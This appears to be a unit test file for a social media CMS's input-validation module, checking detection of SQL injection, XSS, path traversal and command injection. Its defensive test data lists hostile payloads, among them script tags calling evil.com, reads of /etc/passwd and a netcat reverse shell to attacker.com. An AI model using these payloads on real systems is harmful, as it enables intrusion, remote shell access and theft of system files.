/**
 * Unit Tests for Input Validation Security Module
 *
 * Tests comprehensive security validation, sanitization, and threat detection
 * for the social media CMS platform.
 *
 * BUSINESS RULES VALIDATED:
 * -------------------------
 *
 * 1. SQL INJECTION PROTECTION
 *    - Detects common SQL injection patterns (UNION, OR 1=1, DROP TABLE, etc.)
 *    - Rejects strings containing SQL keywords with suspicious patterns
 *    - Intentionally strict: May flag benign strings containing SQL keywords
 *    - Prevents database compromise through malicious input
 *
 * 2. XSS (CROSS-SITE SCRIPTING) PROTECTION
 *    - Detects script tags and event handlers in user input
 *    - Blocks javascript: protocol in URLs
 *    - Prevents injection of malicious HTML/JavaScript
 *    - Protects against stored and reflected XSS attacks
 *
 * 3. PATH TRAVERSAL PROTECTION
 *    - Detects directory traversal patterns (../, ..\\, encoded variants)
 *    - Prevents unauthorized file system access
 *    - Validates file paths stay within allowed directories
 *    - Blocks attempts to access system files (/etc/passwd, etc.)
 *
 * 4. COMMAND INJECTION PROTECTION
 *    - Detects shell command separators (;, &&, |, etc.)
 *    - Blocks command substitution patterns ($(), ``, etc.)
 *    - Prevents execution of arbitrary system commands
 *    - Protects against remote code execution
 *
 * 5. LENGTH VALIDATION
 *    - Enforces context-specific maximum lengths
 *    - Email: 320 characters (RFC 5321 standard)
 *    - Name: 256 characters
 *    - Title: 512 characters
 *    - Body: 10,000 characters
 *    - URL: 2,048 characters
 *    - Prevents buffer overflow and DoS attacks
 *
 * 6. NULL BYTE & CONTROL CHARACTER PROTECTION
 *    - Detects null bytes (\0) used in injection attacks
 *    - Blocks control characters in names and identifiers
 *    - Allows necessary control chars (newlines, tabs) in body content
 *    - Prevents string truncation and parsing exploits
 *
 * 7. STRING SANITIZATION
 *    - Removes null bytes and control characters
 *    - Trims leading/trailing whitespace
 *    - Provides safe fallback for borderline inputs
 *    - Enables "sanitize and retry" workflow
 *
 * 8. SECURE ZOD SCHEMAS
 *    - Email: RFC-compliant email validation with threat detection
 *    - URL: HTTP/HTTPS only, blocks dangerous protocols
 *    - File Path: Validates safe paths, blocks traversal
 *    - Post Body: Content validation with XSS protection
 *    - UUID: Strict UUID v4 format validation
 *    - Media URL: URL validation for media resources
 *    - User Name: Alphanumeric with spaces, threat detection
 *    - Channel ID: Alphanumeric identifiers with length limits
 *
 * 9. RECURSIVE VALIDATION
 *    - Validates nested object structures
 *    - Checks arrays for malicious content
 *    - Ensures deep security across complex payloads
 *    - Prevents bypassing validation through nesting
 *
 * 10. MULTI-THREAT DETECTION
 *     - Can detect multiple threat types in single input
 *     - Reports all identified threats, not just first match
 *     - Enables comprehensive security logging
 *     - Supports forensic analysis of attack attempts
 *
 * VALIDATION CONTEXTS:
 * -------------------
 * - default: General text with strict validation
 * - email: Email addresses (RFC 5321 compliant)
 * - url: HTTP/HTTPS URLs only
 * - filePath: File system paths
 * - name: User/entity names (no control chars)
 * - title: Content titles
 * - body: Post/message bodies (allows newlines/tabs)
 *
 * THREAT TYPES DETECTED:
 * ---------------------
 * - SQL_INJECTION: SQL query manipulation attempts
 * - XSS: Cross-site scripting attacks
 * - PATH_TRAVERSAL: Directory traversal attempts
 * - COMMAND_INJECTION: Shell command injection
 * - EXCESSIVE_LENGTH: Input exceeding safe limits
 * - NULL_BYTE: Null byte injection
 * - CONTROL_CHARACTERS: Invalid control characters
 *
 * SECURITY PHILOSOPHY:
 * -------------------
 * - Defense in depth: Multiple layers of validation
 * - Fail secure: Reject suspicious input, allow explicit safe patterns
 * - Context-aware: Different rules for different input contexts
 * - Audit trail: All threats logged for security monitoring
 * - Zero trust: Validate all input regardless of source
 *
 * Coverage Target: 95%+
 * Test Framework: node:test
 * Dependencies: NONE (pure logic tests, no database required)
 */

import { describe, it } from "node:test";
import * as assert from "node:assert";
import {
  SecurityValidator,
  SecureSchemas,
  createSecureSchema,
} from "../../src/security/inputValidation.js";
import { z } from "zod";

// ============================================================================
// Test Group 1: SQL Injection Detection
// ============================================================================

describe("Input Validation - SQL Injection Detection", () => {
  it("should detect basic SQL injection patterns", () => {
    const sqlInjections = [
      "SELECT * FROM users",
      "admin' OR '1'='1",
      "1; DROP TABLE users--",
      "' OR 1=1--",
      "admin'--",
      "' UNION SELECT * FROM passwords--",
      "'; DELETE FROM users WHERE 'a'='a",
      "1' AND 1=1 UNION SELECT null, null--",
    ];

    sqlInjections.forEach((injection) => {
      const result = SecurityValidator.validateString(injection, "default");
      assert.ok(!result.isValid, `Should detect SQL injection: "${injection.substring(0, 30)}..."`);
      assert.ok(
        result.threats.includes("SQL_INJECTION"),
        `Should flag SQL_INJECTION threat for: "${injection.substring(0, 30)}..."`
      );
    });
  });

  it("should not flag safe SQL-like strings", () => {
    const safeStrings = [
      "I selected a nice chair",
      "My name is Andrew",
      "This is a regular message",
    ];

    safeStrings.forEach((str) => {
      const result = SecurityValidator.validateString(str, "default");
      assert.ok(
        !result.threats.includes("SQL_INJECTION"),
        `Should not flag safe string as SQL injection: "${str}"`
      );
    });
  });

  it("should strictly flag strings with SQL keywords (expected behavior)", () => {
    // These contain SQL keywords but are safe - validator is intentionally strict
    const strictlyFlagged = [
      "Please update me on the progress", // Contains "UPDATE"
      "I need to insert this data", // Contains "INSERT"
      "Select your favorite color", // Contains "SELECT"
    ];

    strictlyFlagged.forEach((str) => {
      const result = SecurityValidator.validateString(str, "default");
      assert.ok(
        result.threats.includes("SQL_INJECTION"),
        `Strict validator should flag SQL keyword in: "${str}"`
      );
    });
  });
});

// ============================================================================
// Test Group 2: XSS (Cross-Site Scripting) Detection
// ============================================================================

describe("Input Validation - XSS Detection", () => {
  it("should detect script tag injections", () => {
    const xssAttacks = [
      "<script>alert('XSS')</script>",
      "<script src='http://evil.com/xss.js'></script>",
      "<<SCRIPT>alert('XSS');//<</SCRIPT>",
      "<script>document.location='http://evil.com'</script>",
      "<iframe src='http://evil.com'></iframe>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<body onload=alert('XSS')>",
      "<div onclick='alert(1)'>click</div>",
    ];

    xssAttacks.forEach((xss) => {
      const result = SecurityValidator.validateString(xss, "default");
      assert.ok(!result.isValid, `Should detect XSS attack: "${xss.substring(0, 40)}..."`);
      assert.ok(
        result.threats.includes("XSS"),
        `Should flag XSS threat for: "${xss.substring(0, 40)}..."`
      );
    });
  });

  it("should not flag safe HTML-like strings", () => {
    const safeHtmlStrings = [
      "I love JavaScript programming",
      "The script was amazing",
      "Check out this link: https://example.com",
    ];

    safeHtmlStrings.forEach((str) => {
      const result = SecurityValidator.validateString(str, "default");
      assert.ok(!result.threats.includes("XSS"), `Should not flag safe HTML-like string: "${str}"`);
    });
  });
});

// ============================================================================
// Test Group 3: Path Traversal Detection
// ============================================================================

describe("Input Validation - Path Traversal Detection", () => {
  it("should detect path traversal attacks", () => {
    const pathTraversals = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32",
      "%2e%2e%2f%2e%2e%2f",
      "....//....//....//etc/passwd",
      "/var/www/../../etc/passwd",
      ".../.../.../.../etc/passwd",
    ];

    pathTraversals.forEach((path) => {
      const result = SecurityValidator.validateString(path, "filePath");
      assert.ok(!result.isValid, `Should detect path traversal: "${path}"`);
      assert.ok(
        result.threats.includes("PATH_TRAVERSAL"),
        `Should flag PATH_TRAVERSAL threat for: "${path}"`
      );
    });
  });

  it("should allow safe file paths", () => {
    const safePaths = ["/uploads/image.jpg", "documents/report.pdf", "user-files/profile.png"];

    safePaths.forEach((path) => {
      const result = SecurityValidator.validateString(path, "filePath");
      assert.ok(!result.threats.includes("PATH_TRAVERSAL"), `Should allow safe path: "${path}"`);
    });
  });
});

// ============================================================================
// Test Group 4: Command Injection Detection
// ============================================================================

describe("Input Validation - Command Injection Detection", () => {
  it("should detect command injection attacks", () => {
    const commandInjections = [
      "test; ls -la",
      "file.txt && cat /etc/passwd",
      "`whoami`",
      "$(cat /etc/passwd)",
      "file.txt | grep password",
      "; nc -e /bin/sh attacker.com 4444",
    ];

    commandInjections.forEach((cmd) => {
      const result = SecurityValidator.validateString(cmd, "default");
      assert.ok(!result.isValid, `Should detect command injection: "${cmd}"`);
      assert.ok(
        result.threats.includes("COMMAND_INJECTION"),
        `Should flag COMMAND_INJECTION threat for: "${cmd}"`
      );
    });
  });

  it("should allow safe command-like strings", () => {
    const safeCommands = ["my-file-name.txt", "user_profile_2024.pdf", "Test file with spaces.doc"];

    safeCommands.forEach((cmd) => {
      const result = SecurityValidator.validateString(cmd, "default");
      assert.ok(
        !result.threats.includes("COMMAND_INJECTION"),
        `Should allow safe command-like string: "${cmd}"`
      );
    });
  });
});

// ============================================================================
// Test Group 5: Length Validation
// ============================================================================

describe("Input Validation - Length Validation", () => {
  it("should detect excessive email length", () => {
    const longEmail = "a".repeat(330) + "@example.com";
    const result = SecurityValidator.validateString(longEmail, "email");

    assert.ok(!result.isValid, "Should detect excessive email length");
    assert.ok(
      result.threats.includes("EXCESSIVE_LENGTH"),
      "Should flag EXCESSIVE_LENGTH for long email"
    );
  });

  it("should allow valid length emails", () => {
    const validEmail = "user@example.com";
    const result = SecurityValidator.validateString(validEmail, "email");

    assert.ok(!result.threats.includes("EXCESSIVE_LENGTH"), "Should allow valid length email");
  });

  it("should enforce context-specific length limits", () => {
    const contexts: Array<{ context: string; maxLength: number }> = [
      { context: "name", maxLength: 256 },
      { context: "title", maxLength: 512 },
      { context: "body", maxLength: 10000 },
      { context: "url", maxLength: 2048 },
    ];

    contexts.forEach(({ context, maxLength }) => {
      const tooLong = "a".repeat(maxLength + 1);
      const result = SecurityValidator.validateString(tooLong, context);

      assert.ok(
        result.threats.includes("EXCESSIVE_LENGTH"),
        `Should detect excessive length for context: ${context}`
      );
    });
  });
});

// ============================================================================
// Test Group 6: Null Byte and Control Characters
// ============================================================================

describe("Input Validation - Null Byte & Control Characters", () => {
  it("should detect null bytes in strings", () => {
    const nullByteString = "test\0data";
    const result = SecurityValidator.validateString(nullByteString, "default");

    assert.ok(!result.isValid, "Should detect null byte in string");
    assert.ok(result.threats.includes("NULL_BYTE"), "Should flag NULL_BYTE threat");
  });

  it("should detect control characters in names", () => {
    const controlChars = "test\x00\x01\x02data";
    const result = SecurityValidator.validateString(controlChars, "name");

    assert.ok(!result.isValid, "Should detect control characters");
    assert.ok(
      result.threats.includes("CONTROL_CHARACTERS"),
      "Should flag CONTROL_CHARACTERS threat"
    );
  });

  it("should allow control characters in body context", () => {
    const bodyWithNewlines = "Line 1\nLine 2\rLine 3\tTabbed";
    const result = SecurityValidator.validateString(bodyWithNewlines, "body");

    // Body context allows some control characters (like newlines)
    assert.ok(
      result.isValid || !result.threats.includes("CONTROL_CHARACTERS"),
      "Body context should allow newlines and tabs"
    );
  });
});

// ============================================================================
// Test Group 7: String Sanitization
// ============================================================================

describe("Input Validation - String Sanitization", () => {
  it("should remove control characters", () => {
    const dirtyString = "test\x00\x01\x02data";
    const cleaned = SecurityValidator.sanitizeString(dirtyString);

    assert.strictEqual(cleaned, "testdata", "Should remove control characters");
  });

  it("should remove null bytes", () => {
    const withNullBytes = "test\0null\0bytes";
    const cleaned = SecurityValidator.sanitizeString(withNullBytes);

    assert.strictEqual(cleaned, "testnullbytes", "Should remove null bytes");
  });

  it("should trim whitespace", () => {
    const withSpaces = "  test string  ";
    const cleaned = SecurityValidator.sanitizeString(withSpaces);

    assert.strictEqual(cleaned, "test string", "Should trim whitespace");
  });
});

// ============================================================================
// Test Group 8: Secure Zod Schemas - Email
// ============================================================================

describe("Secure Zod Schemas - Email", () => {
  it("should validate correct email format", () => {
    const result = SecureSchemas.userEmail.safeParse("user@example.com");

    assert.ok(result.success, "Should accept valid email");
  });

  it("should reject email with SQL injection", () => {
    const result = SecureSchemas.userEmail.safeParse("admin'--@example.com");

    assert.ok(!result.success, "Should reject email with SQL injection");
  });

  it("should reject invalid email format", () => {
    const result = SecureSchemas.userEmail.safeParse("not-an-email");

    assert.ok(!result.success, "Should reject invalid email format");
  });
});

// ============================================================================
// Test Group 9: Secure Zod Schemas - URL
// ============================================================================

describe("Secure Zod Schemas - URL", () => {
  it("should validate HTTPS URLs", () => {
    const result = SecureSchemas.url.safeParse("https://example.com/page");

    assert.ok(result.success, "Should accept valid HTTPS URL");
  });

  it("should validate HTTP URLs", () => {
    const result = SecureSchemas.url.safeParse("http://example.com");

    assert.ok(result.success, "Should accept valid HTTP URL");
  });

  it("should reject javascript protocol", () => {
    const result = SecureSchemas.url.safeParse("javascript:alert(1)");

    assert.ok(!result.success, "Should reject javascript: protocol");
  });

  it("should reject file protocol", () => {
    const result = SecureSchemas.url.safeParse("file:///etc/passwd");

    assert.ok(!result.success, "Should reject file: protocol");
  });
});

// ============================================================================
// Test Group 10: Secure Zod Schemas - File Path
// ============================================================================

describe("Secure Zod Schemas - File Path", () => {
  it("should validate safe file paths", () => {
    const result = SecureSchemas.filePath.safeParse("uploads/image.jpg");

    assert.ok(result.success, "Should accept valid file path");
  });

  it("should reject path traversal in file paths", () => {
    const result = SecureSchemas.filePath.safeParse("../../../etc/passwd");

    assert.ok(!result.success, "Should reject path traversal");
  });
});

// ============================================================================
// Test Group 11: Secure Zod Schemas - Post Body
// ============================================================================

describe("Secure Zod Schemas - Post Body", () => {
  it("should validate normal post body", () => {
    const validBody = "This is a normal post with some content.";
    const result = SecureSchemas.postBody.safeParse(validBody);

    assert.ok(result.success, "Should accept valid post body");
  });

  it("should reject post body with XSS", () => {
    const xssBody = "Check this out: <script>alert('XSS')</script>";
    const result = SecureSchemas.postBody.safeParse(xssBody);

    assert.ok(!result.success, "Should reject post body with XSS");
  });

  it("should reject empty post body", () => {
    const result = SecureSchemas.postBody.safeParse("");

    assert.ok(!result.success, "Should reject empty post body (min length 1)");
  });
});

// ============================================================================
// Test Group 12: Secure Zod Schemas - UUID
// ============================================================================

describe("Secure Zod Schemas - UUID", () => {
  it("should validate correct UUID format", () => {
    const validUuid = "123e4567-e89b-12d3-a456-426614174000";
    const result = SecureSchemas.uuid.safeParse(validUuid);

    assert.ok(result.success, "Should accept valid UUID");
  });

  it("should reject invalid UUID", () => {
    const result = SecureSchemas.uuid.safeParse("not-a-uuid");

    assert.ok(!result.success, "Should reject invalid UUID");
  });
});

// ============================================================================
// Test Group 13: createSecureSchema - Recursive Validation
// ============================================================================

describe("Secure Schemas - Recursive Validation", () => {
  it("should detect XSS in nested object structures", () => {
    const testSchema = createSecureSchema(
      z.object({
        title: z.string(),
        content: z.string(),
        metadata: z.object({
          author: z.string(),
          tags: z.array(z.string()),
        }),
      })
    );

    const maliciousData = {
      title: "Normal Title",
      content: "<script>alert('XSS')</script>",
      metadata: {
        author: "John Doe",
        tags: ["tech", "news"],
      },
    };

    const result = testSchema.safeParse(maliciousData);

    assert.ok(!result.success, "Should detect XSS in nested content through recursive validation");
  });

  it("should detect SQL injection in arrays", () => {
    const testSchema = createSecureSchema(
      z.object({
        items: z.array(z.string()),
      })
    );

    const maliciousData = {
      items: ["normal item", "' OR 1=1--", "another normal item"],
    };

    const result = testSchema.safeParse(maliciousData);

    assert.ok(!result.success, "Should detect SQL injection in array through recursive validation");
  });

  it("should validate clean nested data", () => {
    const testSchema = createSecureSchema(
      z.object({
        title: z.string(),
        tags: z.array(z.string()),
      })
    );

    const cleanData = {
      title: "My Blog Post",
      tags: ["javascript", "tutorial", "coding"],
    };

    const result = testSchema.safeParse(cleanData);

    assert.ok(result.success, "Should accept clean nested data");
  });
});

// ============================================================================
// Test Group 14: Multiple Threat Detection
// ============================================================================

describe("Input Validation - Multiple Threat Detection", () => {
  it("should detect multiple threat types in single input", () => {
    const multiThreat = "<script>alert('XSS')</script>' OR 1=1-- ../../../etc/passwd";
    const result = SecurityValidator.validateString(multiThreat, "default");

    assert.ok(!result.isValid, "Should invalidate multi-threat string");
  });

  it("should report XSS in multi-threat string", () => {
    const multiThreat = "<script>alert('XSS')</script>' OR 1=1-- ../../../etc/passwd";
    const result = SecurityValidator.validateString(multiThreat, "default");

    assert.ok(result.threats.includes("XSS"), "Should detect XSS in multi-threat string");
  });

  it("should report SQL injection in multi-threat string", () => {
    const multiThreat = "<script>alert('XSS')</script>' OR 1=1-- ../../../etc/passwd";
    const result = SecurityValidator.validateString(multiThreat, "default");

    assert.ok(
      result.threats.includes("SQL_INJECTION"),
      "Should detect SQL injection in multi-threat string"
    );
  });

  it("should report path traversal in multi-threat string", () => {
    const multiThreat = "<script>alert('XSS')</script>' OR 1=1-- ../../../etc/passwd";
    const result = SecurityValidator.validateString(multiThreat, "default");

    assert.ok(
      result.threats.includes("PATH_TRAVERSAL"),
      "Should detect path traversal in multi-threat string"
    );
  });
});

// ============================================================================
// Test Group 15: Secure Zod Schemas - Media URL
// ============================================================================

describe("Secure Zod Schemas - Media URL", () => {
  it("should validate HTTPS media URLs", () => {
    const result = SecureSchemas.mediaUrl.safeParse("https://cdn.example.com/media/video.mp4");

    assert.ok(result.success, "Should accept valid HTTPS media URL");
  });

  it("should allow HTTP protocol for media URLs", () => {
    const result = SecureSchemas.mediaUrl.safeParse("http://example.com/image.jpg");

    assert.ok(result.success, "Should allow HTTP protocol for media URLs");
  });

  it("should reject invalid media URL format", () => {
    const result = SecureSchemas.mediaUrl.safeParse("not-a-url");

    assert.ok(!result.success, "Should reject invalid media URL format");
  });

  it("should reject javascript protocol in media URLs", () => {
    const result = SecureSchemas.mediaUrl.safeParse("javascript:alert(1)");

    assert.ok(!result.success, "Should reject javascript: protocol for media URLs");
  });
});

// ============================================================================
// Test Group 16: Secure Zod Schemas - User Name
// ============================================================================

describe("Secure Zod Schemas - User Name", () => {
  it("should validate alphanumeric user names", () => {
    const result = SecureSchemas.userName.safeParse("JohnDoe123");

    assert.ok(result.success, "Should accept valid alphanumeric user name");
  });

  it("should validate user names with spaces", () => {
    const result = SecureSchemas.userName.safeParse("John Doe");

    assert.ok(result.success, "Should accept user name with spaces");
  });

  it("should reject XSS attempts in user names", () => {
    const result = SecureSchemas.userName.safeParse("<script>alert('xss')</script>");

    assert.ok(!result.success, "Should reject XSS attempt in user name");
  });

  it("should reject empty user names", () => {
    const result = SecureSchemas.userName.safeParse("");

    assert.ok(!result.success, "Should reject empty user name");
  });

  it("should reject SQL injection in user names", () => {
    const result = SecureSchemas.userName.safeParse("admin' OR '1'='1");

    assert.ok(!result.success, "Should reject SQL injection in user name");
  });
});

// ============================================================================
// Test Group 17: Secure Zod Schemas - Channel ID
// ============================================================================

describe("Secure Zod Schemas - Channel ID", () => {
  it("should validate alphanumeric channel IDs with hyphens/underscores", () => {
    const result = SecureSchemas.channelId.safeParse("channel-123_abc");

    assert.ok(result.success, "Should accept valid channel ID");
  });

  it("should reject SQL injection in channel IDs", () => {
    const result = SecureSchemas.channelId.safeParse("' OR 1=1--");

    assert.ok(!result.success, "Should reject SQL injection in channel ID");
  });

  it("should reject XSS in channel IDs", () => {
    const result = SecureSchemas.channelId.safeParse("<script>alert(1)</script>");

    assert.ok(!result.success, "Should reject XSS in channel ID");
  });

  it("should reject channel IDs exceeding length limit", () => {
    const result = SecureSchemas.channelId.safeParse("a".repeat(201));

    assert.ok(!result.success, "Should reject channel ID exceeding 200 characters");
  });
});
